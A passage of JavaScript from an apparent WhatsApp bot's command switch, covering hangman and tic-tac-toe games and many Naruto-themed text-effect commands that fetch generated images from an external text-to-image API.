    if (game.guessed.includes(letter)) return m.reply("⚠️ Already guessed.");

    game.guessed.push(letter);
    if (game.word.includes(letter)) {
        game.display = game.display.map((c, i) => (game.word[i] === letter ? letter : c));
    } else {
        game.attempts -= 1;
    }

    // Check win
    if (!game.display.includes("_")) {
        await rich.sendMessage(chatId, { text: `🎉 You guessed the word: ${game.word}` }, { quoted: m });
        delete hangmanGames[chatId];
        return;
    }

    // Check lose
    if (game.attempts <= 0) {
        await rich.sendMessage(chatId, { text: `💀 Game over! The word was: ${game.word}` }, { quoted: m });
        delete hangmanGames[chatId];
        return;
    }

    await rich.sendMessage(chatId, { text: `🕹 Hangman\nWord: ${game.display.join(" ")}\nAttempts left: ${game.attempts}\nVisual:\n${hangmanVisual[6 - game.attempts]}\nGuessed: ${game.guessed.join(", ")}` }, { quoted: m });
}
break;
case "tictactoe": {
    const chatId = m.chat;
    const args = text?.split(" ") || [];
    let game = tictactoeGames[chatId];

    // Start new game
    if (!game) {
        const mentions = m.mentionedJid;
        if (!mentions || mentions.length < 2) return m.reply("❌ Mention 2 users. Example: tictactoe @user1 @user2");

        const board = Array(9).fill(null); // null means empty
        const turn = mentions[0];
        tictactoeGames[chatId] = { board, turn, players: mentions };
        const display = board.map((v, i) => numberEmojis[i]).join("");
        await rich.sendMessage(chatId, { text: `🎮 Tic-Tac-Toe Started!\n${display}\nTurn: @${turn.split("@")[0]}\nPlay: tictactoe <position 1-9>` }, { quoted: m, mentions });
        return;
    }

    // Play move
    if (!args[0]) return m.reply("❌ Choose position 1-9. Example: tictactoe 5");
    const pos = parseInt(args[0]) - 1;
    if (isNaN(pos) || pos < 0 || pos > 8) return m.reply("❌ Invalid position!");
    if (m.sender !== game.turn) return m.reply("❌ Not your turn!");
    if (game.board[pos] !== null) return m.reply("❌ Already taken!");

    const symbol = game.turn === game.players[0] ? "❌" : "⭕";
    game.board[pos] = symbol;

    // Check win
    const b = game.board;
    const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
    const winner = wins.find(w => w.every(i => b[i] === symbol));

    const displayBoard = b.map((v, i) => v || numberEmojis[i]).join("");

    if (winner) {
        await rich.sendMessage(chatId, { text: `🎉 Player @${game.turn.split("@")[0]} wins!\n${displayBoard}` }, { quoted: m, mentions: [game.turn] });
        delete tictactoeGames[chatId];
        return;
    }

    if (!b.includes(null)) {
        await rich.sendMessage(chatId, { text: `🤝 It's a tie!\n${displayBoard}` }, { quoted: m });
        delete tictactoeGames[chatId];
        return;
    }

    // Next turn
    game.turn = game.turn === game.players[0] ? game.players[1] : game.players[0];
    await rich.sendMessage(chatId, { text: `🎮 Next Turn: @${game.turn.split("@")[0]}\n${displayBoard}` }, { quoted: m, mentions: [game.turn] });
}
break;
 // ✨ TEXT MAKER COMMANDS HUB
// Usage: /command Your Text
// Example: /glitchtext nexus
// ▫️ /glitchtext - Digital glitch effects
case "glitchtext": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `⚡ *Tsukuyomi: Reality Distortion*\n\n` +
                  `❌ Please provide text to distort!\n\n` +
                  `*Example:* ${prefix}glitchtext Lumora Tech\n\n` +
                  `_"Bend reality itself with the Mangekyō Sharingan."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/glitchtext?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🌀 *Tsukuyomi Activated*\n\n` +
                     `⚡ Reality distorted for: *${text}*\n\n` +
                     `_"You are trapped in my genjutsu... witness the glitch."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Genjutsu Failed*\n\n` +
                  `❌ Error generating Glitch Text\n\n` +
                  `_"Even the Sharingan has its limits..."_`
        }, { quoted: m });
    }
}
break;

// ▫️ /writetext - Write on wet glass
case "writetext": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `📜 *Ancient Scroll Technique*\n\n` +
                  `❌ Please provide text to inscribe!\n\n` +
                  `*Example:* ${prefix}writetext Lumora Tech\n\n` +
                  `_"Every word carries the weight of a thousand battles."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/writetext?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `✍️ *Ancient Scroll Inscribed*\n\n` +
                     `📜 Text written: *${text}*\n\n` +
                     `_"Written in the language of shinobi... eternal and powerful."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Inscription Failed*\n\n` +
                  `❌ Error generating Write Text logo\n\n` +
                  `_"The ink has run dry... try again."_`
        }, { quoted: m });
    }
}
break;

// ▫️ /advancedglow - Advanced glow effects
case "advancedglow": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🔴 *Susanoo: Ethereal Aura*\n\n` +
                  `❌ Please provide text to illuminate!\n\n` +
                  `*Example:* ${prefix}advancedglow Lumora Tech\n\n` +
                  `_"Channel the divine glow of the Susanoo."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/advancedglow?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🔴 *Susanoo Manifested*\n\n` +
                     `💡 Divine glow radiates: *${text}*\n\n` +
                     `_"Behold the ethereal light of the perfect warrior... Susanoo's power revealed."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Susanoo Manifestation Failed*\n\n` +
                  `❌ Error generating Advanced Glow\n\n` +
                  `_"The chakra is insufficient... the divine glow fades."_`
        }, { quoted: m });
    }
}
break;

// ▫️ /typographytext - Typography on pavement
case "typographytext": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🖋️ *Calligraphy Mastery Technique*\n\n` +
                  `❌ Please provide text to craft!\n\n` +
                  `*Example:* ${prefix}typographytext Lumora Tech\n\n` +
                  `_"The art of the written word... perfected through discipline."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/typographytext?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🖋️ *Masterful Calligraphy Complete*\n\n` +
                     `📖 Typography crafted: *${text}*\n\n` +
                     `_"Each stroke carries the essence of a true shinobi."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Calligraphy Failed*\n\n` +
                  `❌ Error generating Typography Text\n\n` +
                  `_"The brush has slipped... perfection requires practice."_`
        }, { quoted: m });
    }
}
break;

case "pixelglitch": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🧩 *Izanami: Fragment Reality*\n\n` +
                  `❌ Please provide text to fragment!\n\n` +
                  `*Example:* ${prefix}pixelglitch Lumora Tech\n\n` +
                  `_"Break reality into infinite pieces with the forbidden jutsu."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/pixelglitch?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🧩 *Izanami Activated*\n\n` +
                     `⚡ Reality fragmented: *${text}*\n\n` +
                     `_"Trapped in an endless loop of pixelated illusion."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Izanami Disrupted*\n\n` +
                  `❌ Error generating Pixel Glitch\n\n` +
                  `_"The forbidden technique has backfired..."_`
        }, { quoted: m });
    }
}
break;

case "neonglitch": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `💥 *Amaterasu: Eternal Flames*\n\n` +
                  `❌ Please provide text to ignite!\n\n` +
                  `*Example:* ${prefix}neonglitch Lumora Tech\n\n` +
                  `_"Black flames that burn with eternal neon intensity."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/neonglitch?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🔥 *Amaterasu Unleashed*\n\n` +
                     `💥 Eternal flames burn: *${text}*\n\n` +
                     `_"The black flames of Amaterasu never extinguish... glowing eternally."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Amaterasu Failed to Ignite*\n\n` +
                  `❌ Error generating Neon Glitch\n\n` +
                  `_"The flames could not be summoned..."_`
        }, { quoted: m });
    }
}
break;

case "flagtext": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🏴 *Hidden Village Banner*\n\n` +
                  `❌ Please provide text to display!\n\n` +
                  `*Example:* ${prefix}flagtext Lumora Tech\n\n` +
                  `_"Fly the banner of your village with pride."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/flagtext?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🏴 *Village Banner Raised*\n\n` +
                     `🇳🇬 Banner displayed: *${text}*\n\n` +
                     `_"Every village has its symbol... wear it with honor."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Banner Creation Failed*\n\n` +
                  `❌ Error generating Flag Text\n\n` +
                  `_"The banner could not be forged..."_`
        }, { quoted: m });
    }
}
break;

// ▫️ /flag3dtext - 3D American flag text
case "flag3dtext": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🏴 *3D Village Emblem Technique*\n\n` +
                  `❌ Please provide text to sculpt!\n\n` +
                  `*Example:* ${prefix}flag3dtext Lumora Tech\n\n` +
                  `_"Forge your village symbol in three dimensions."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/flag3dtext?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🏴 *3D Emblem Forged*\n\n` +
                     `⚔️ Dimensional banner created: *${text}*\n\n` +
                     `_"A symbol that transcends dimensions... eternal pride."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Emblem Forging Failed*\n\n` +
                  `❌ Error generating 3D Flag Text\n\n` +
                  `_"The dimensional forge has cooled..."_`
        }, { quoted: m });
    }
}
break;

case "deletingtext": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🩶 *Izanagi: Erase Reality*\n\n` +
                  `❌ Please provide text to erase!\n\n` +
                  `*Example:* ${prefix}deletingtext Lumora Tech\n\n` +
                  `_"Rewrite reality... erase what once existed."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/deletingtext?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🩶 *Izanagi Activated*\n\n` +
                     `⚡ Reality erased: *${text}*\n\n` +
                     `_"What was once real... now fades into nothingness."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Izanagi Disrupted*\n\n` +
                  `❌ Error generating Deleting Text\n\n` +
                  `_"Reality resists erasure..."_`
        }, { quoted: m });
    }
}
break;

case "blackpinkstyle": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🎀 *Sakura Blossom Style*\n\n` +
                  `❌ Please provide text to beautify!\n\n` +
                  `*Example:* ${prefix}blackpinkstyle Lumora Tech\n\n` +
                  `_"Even in darkness, beauty blooms like cherry blossoms."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/blackpinkstyle?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🌸 *Sakura Style Manifested*\n\n` +
                     `🎀 Elegant design created: *${text}*\n\n` +
                     `_"Beauty and power combined... the way of the kunoichi."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Style Creation Failed*\n\n` +
                  `❌ Error generating Blackpink Style\n\n` +
                  `_"The petals have withered..."_`
        }, { quoted: m });
    }
}
break;
// ▫️ /glowingtext - Glowing text effects
case "glowingtext": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `💫 *Chakra Radiance Technique*\n\n` +
                  `❌ Please provide text to illuminate!\n\n` +
                  `*Example:* ${prefix}glowingtext Lumora Tech\n\n` +
                  `_"Let your chakra flow and radiate light."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/glowingtext?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `💫 *Chakra Radiating*\n\n` +
                     `✨ Divine light emanates: *${text}*\n\n` +
                     `_"Your chakra glows with immense power... visible to all."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Chakra Flow Disrupted*\n\n` +
                  `❌ Error generating Glowing Text\n\n` +
                  `_"The chakra network has been blocked..."_`
        }, { quoted: m });
    }
}
break;

case "underwatertext": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🌊 *Water Style: Submerged Technique*\n\n` +
                  `❌ Please provide text to submerge!\n\n` +
                  `*Example:* ${prefix}underwatertext Lumora Tech\n\n` +
                  `_"Dive into the depths... where water conceals all."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/underwatertext?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🌊 *Water Style Executed*\n\n` +
                     `💧 Submerged text: *${text}*\n\n` +
                     `_"Hidden beneath the surface... like secrets in the deep."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Water Style Failed*\n\n` +
                  `❌ Error generating Underwater Text\n\n` +
                  `_"The water refuses to flow..."_`
        }, { quoted: m });
    }
}
break;

case "logomaker": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🐦‍⬛ *Crow Summoning: Emblem Creation*\n\n` +
                  `❌ Please provide text to forge!\n\n` +
                  `*Example:* ${prefix}logomaker Lumora Tech\n\n` +
                  `_"Summon the crows to craft your personal emblem."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/logomaker?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🐦‍⬛ *Crow Emblem Forged*\n\n` +
                     `⚔️ Personal logo created: *${text}*\n\n` +
                     `_"The crows have assembled your mark... fly with pride."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Summoning Disrupted*\n\n` +
                  `❌ Error generating Logo Maker\n\n` +
                  `_"The crows have dispersed..."_`
        }, { quoted: m });
    }
}
break;

case "cartoonstyle": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🎨 *Art of Deception: Playful Style*\n\n` +
                  `❌ Please provide text to transform!\n\n` +
                  `*Example:* ${prefix}cartoonstyle Lumora Tech\n\n` +
                  `_"Sometimes a lighter touch deceives better than force."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/cartoonstyle?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🎨 *Playful Style Activated*\n\n` +
                     `🖌️ Cartoon design created: *${text}*\n\n` +
                     `_"Behind the playful exterior... lies hidden strength."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Style Transformation Failed*\n\n` +
                  `❌ Error generating Cartoon Style Text\n\n` +
                  `_"The illusion could not be cast..."_`
        }, { quoted: m });
    }
}
break;

case "papercutstyle": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `✂️ *Paper Shuriken Technique*\n\n` +
                  `❌ Please provide text to cut!\n\n` +
                  `*Example:* ${prefix}papercutstyle Lumora Tech\n\n` +
                  `_"Sharp as a blade... delicate as paper."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/papercutstyle?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `✂️ *Paper Style Crafted*\n\n` +
                     `📄 Layered design: *${text}*\n\n` +
                     `_"Precision cutting... each layer reveals deeper meaning."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Paper Technique Failed*\n\n` +
                  `❌ Error generating Paper Cut Style\n\n` +
                  `_"The paper has torn..."_`
        }, { quoted: m });
    }
}
break;

// ▫️ /watercolortext - Watercolor text effect
case "watercolortext": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🖌️ *Ink Style: Flowing Brushwork*\n\n` +
                  `❌ Please provide text to paint!\n\n` +
                  `*Example:* ${prefix}watercolortext Lumora Tech\n\n` +
                  `_"Let the ink flow like water... art and battle as one."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/watercolortext?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🖌️ *Ink Style Perfected*\n\n` +
                     `🎨 Watercolor art created: *${text}*\n\n` +
                     `_"Each brushstroke carries the soul of a warrior."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Brushwork Failed*\n\n` +
                  `❌ Error generating Watercolor Text\n\n` +
                  `_"The ink has dried before completion..."_`
        }, { quoted: m });
    }
}
break;

case "effectclouds": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `☁️ *Heaven's Message Technique*\n\n` +
                  `❌ Please provide text to inscribe in the sky!\n\n` +
                  `*Example:* ${prefix}effectclouds Lumora Tech\n\n` +
                  `_"Write your message where the heavens can read it."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/effectclouds?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `☁️ *Heavenly Inscription Complete*\n\n` +
                     `🌤️ Message in the clouds: *${text}*\n\n` +
                     `_"Words carried by the wind... visible to all who look up."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Sky Writing Failed*\n\n` +
                  `❌ Error generating Cloud Text\n\n` +
                  `_"The clouds have dispersed..."_`
        }, { quoted: m });
    }
}
break;

case "blackpinklogo": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `💖 *Sakura Emblem Technique*\n\n` +
                  `❌ Please provide text to beautify!\n\n` +
                  `*Example:* ${prefix}blackpinklogo Lumora Tech\n\n` +
                  `_"Grace and elegance forged into a symbol."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/blackpinklogo?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `💖 *Sakura Emblem Created*\n\n` +
                     `🌸 Elegant logo forged: *${text}*\n\n` +
                     `_"Beauty as fierce as any blade... the kunoichi way."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Emblem Creation Failed*\n\n` +
                  `❌ Error generating Blackpink Logo\n\n` +
                  `_"The cherry blossoms have fallen..."_`
        }, { quoted: m });
    }
}
break;

case "gradienttext": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🌈 *Chakra Spectrum Technique*\n\n` +
                  `❌ Please provide text to transform!\n\n` +
                  `*Example:* ${prefix}gradienttext Lumora Tech\n\n` +
                  `_"Channel all chakra natures into one flowing spectrum."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/gradienttext?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🌈 *Chakra Spectrum Unleashed*\n\n` +
                     `⚡ Multi-nature gradient: *${text}*\n\n` +
                     `_"All five chakra natures flowing as one... perfect harmony."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Chakra Fusion Failed*\n\n` +
                  `❌ Error generating Gradient Text\n\n` +
                  `_"The chakra natures refuse to merge..."_`
        }, { quoted: m });
    }
}
break;

case "summerbeach": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🏖️ *Sand Writing Technique*\n\n` +
                  `❌ Please provide text to write in sand!\n\n` +
                  `*Example:* ${prefix}summerbeach Lumora Tech\n\n` +
                  `_"Leave your mark in the sand... before the tide erases it."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/summerbeach?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🏖️ *Sand Inscription Complete*\n\n` +
                     `🌊 Written in sand: *${text}*\n\n` +
                     `_"Temporary yet beautiful... like all things in this world."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Sand Writing Failed*\n\n` +
                  `❌ Error generating Summer Beach Text\n\n` +
                  `_"The waves have washed away the words..."_`
        }, { quoted: m });
    }
}
break;

// ▫️ /luxurygold - Luxury gold text effect
case "luxurygold": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🥇 *Golden Seal Technique*\n\n` +
                  `❌ Please provide text to forge in gold!\n\n` +
                  `*Example:* ${prefix}luxurygold Lumora Tech\n\n` +
                  `_"Forge your legacy in eternal gold... worthy of legends."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/luxurygold?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🥇 *Golden Seal Forged*\n\n` +
                     `✨ Luxury gold created: *${text}*\n\n` +
                     `_"Shining like the sun... a mark of true power and prestige."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Gold Forging Failed*\n\n` +
                  `❌ Error generating Luxury Gold Text\n\n` +
                  `_"The gold has tarnished before completion..."_`
        }, { quoted: m });
    }
}
break;

case "multicoloredneon": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🌈 *Rainbow Flame Technique*\n\n` +
                  `❌ Please provide text to illuminate!\n\n` +
                  `*Example:* ${prefix}multicoloredneon Lumora Tech\n\n` +
                  `_"Burn with all colors of the chakra spectrum."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/multicoloredneon?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🌈 *Rainbow Flames Ignited*\n\n` +
                     `🔥 Multicolored brilliance: *${text}*\n\n` +
                     `_"A symphony of colors... each hue represents a different power."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Rainbow Flames Extinguished*\n\n` +
                  `❌ Error generating Multicolored Neon\n\n` +
                  `_"The colors have faded into darkness..."_`
        }, { quoted: m });
    }
}
break;

case "sandsummer": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🏝️ *Desert Wind Inscription*\n\n` +
                  `❌ Please provide text to etch in sand!\n\n` +
                  `*Example:* ${prefix}sandsummer Lumora Tech\n\n` +
                  `_"Write your story before the desert wind claims it."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/sandsummer?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🏝️ *Sand Inscription Etched*\n\n` +
                     `⛱️ Desert message: *${text}*\n\n` +
                     `_"Fleeting as the summer breeze... yet beautiful while it lasts."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Sand Writing Failed*\n\n` +
                  `❌ Error generating Sand Summer Text\n\n` +
                  `_"The desert wind has erased all traces..."_`
        }, { quoted: m });
    }
}
break;

case "galaxywallpaper": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🌌 *Infinite Tsukuyomi: Cosmic Vision*\n\n` +
                  `❌ Please provide text for the cosmic realm!\n\n` +
                  `*Example:* ${prefix}galaxywallpaper Lumora Tech\n\n` +
                  `_"Project your vision across the infinite cosmos."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/galaxywallpaper?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🌌 *Cosmic Vision Manifested*\n\n` +
                     `⭐ Galaxy wallpaper created: *${text}*\n\n` +
                     `_"Your name written among the stars... eternal and infinite."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Cosmic Projection Failed*\n\n` +
                  `❌ Error generating Galaxy Wallpaper\n\n` +
                  `_"The stars refuse to align..."_`
        }, { quoted: m });
    }
}
break;

case "style1917": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🎖️ *Ancient Warrior's Mark*\n\n` +
                  `❌ Please provide text to inscribe!\n\n` +
                  `*Example:* ${prefix}style1917 Lumora Tech\n\n` +
                  `_"Honor the warriors of old with timeless style."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/style1917?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🎖️ *Warrior's Mark Inscribed*\n\n` +
                     `⚔️ Ancient style forged: *${text}*\n\n` +
                     `_"A mark from a bygone era... when honor meant everything."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Ancient Inscription Failed*\n\n` +
                  `❌ Error generating 1917 Style Text\n\n` +
                  `_"The ancient techniques have been forgotten..."_`
        }, { quoted: m });
    }
}
break;

case "makingneon": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🌠 *Stellar Flame Technique*\n\n` +
                  `❌ Please provide text to ignite!\n\n` +
                  `*Example:* ${prefix}makingneon Lumora Tech\n\n` +
                  `_"Combine the neon glow with cosmic energy."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/makingneon?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🌠 *Stellar Flames Blazing*\n\n` +
                     `💫 Cosmic neon created: *${text}*\n\n` +
                     `_"Burning bright as distant stars... visible across galaxies."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Stellar Ignition Failed*\n\n` +
                  `❌ Error generating Making Neon\n\n` +
                  `_"The stellar flames could not ignite..."_`
        }, { quoted: m });
    }
}
break;

// ▫️ /royaltext - Royal text effect
case "royaltext": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `👑 *Hokage's Royal Decree*\n\n` +
                  `❌ Please provide text to decree!\n\n` +
                  `*Example:* ${prefix}royaltext Lumora Tech\n\n` +
                  `_"Command with the authority of a Hokage... royal and absolute."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/royaltext?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `👑 *Royal Decree Issued*\n\n` +
                     `⚜️ Hokage's command: *${text}*\n\n` +
                     `_"A decree worthy of the highest authority... obey without question."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
            text: `⚠️ *Royal Decree Failed*\n\n` +
                  `❌ Error generating Royal Text\n\n` +
                  `_"The crown's authority has been challenged..."_`
        }, { quoted: m });
    }
}
break;

case "freecreate": {
    if (args.length < 1) {
        return rich.sendMessage(from, { 
            text: `🧊 *Hologram Projection Technique*\n\n` +
                  `❌ Please provide text to project!\n\n` +
                  `*Example:* ${prefix}freecreate Lumora Tech\n\n` +
                  `_"Project your presence in three dimensions... a shinobi illusion."_`
        }, { quoted: m });
    }
    
    let text = args.join(" ");
    
    try {
        let url = `https://apis.prexzyvilla.site/freecreate?text=${encodeURIComponent(text)}`;
        await rich.sendMessage(from, { 
            image: { url }, 
            caption: `🧊 *Hologram Manifested*\n\n` +
                     `🔷 3D projection created: *${text}*\n\n` +
                     `_"A dimensional illusion so real... you cannot tell truth from deception."_ - Itachi Uchiha`
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        await rich.sendMessage(from, { 
